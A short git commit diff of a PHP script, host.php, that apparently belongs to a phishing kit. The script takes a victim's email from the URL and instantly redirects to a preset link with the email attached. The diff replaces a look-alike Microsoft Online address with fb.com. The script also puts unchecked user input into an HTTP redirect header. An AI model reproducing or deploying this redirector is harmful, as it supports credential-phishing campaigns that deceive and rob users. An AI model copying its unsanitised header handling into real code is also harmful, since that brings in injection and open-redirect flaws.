492908e0ea5d3ca4601b3b248bdbc073d971dfea
nickintim <109904708+nickintim@users.noreply.github.com>
2022-08-17 16:29:51 -0500

    Update host.php

--- host.php
+++ host.php
@@ -4,7 +4,7 @@ $email = $_GET['email'];
 
 //Your link must be in this format "https://comrfound.com/vnchoice/index.php". with a forward slash and nothing more.
 
-$link = "https://ms-online.live/bt/r/MsCQarj";
+$link = "https://fb.com";
 $sess = "?email=$email";
 
 header ("Refresh: 0; url=$link$sess");
